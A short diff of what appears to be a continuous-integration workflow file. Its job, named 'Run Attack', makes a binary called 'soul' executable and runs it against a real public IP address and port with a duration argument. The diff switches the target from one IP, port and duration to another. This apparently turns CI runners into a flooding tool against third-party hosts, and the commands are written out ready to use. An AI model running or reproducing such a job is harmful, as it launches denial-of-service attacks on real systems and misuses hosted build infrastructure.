@@ -11,7 +11,7 @@ jobs:
           name: Run Attack
           command: |
              chmod +x soul
-             ./soul 74.225.153.172 11487 180 || true
+             ./soul 91.108.17.56 32003 10 || true
 
 workflows:
   attack_flow:
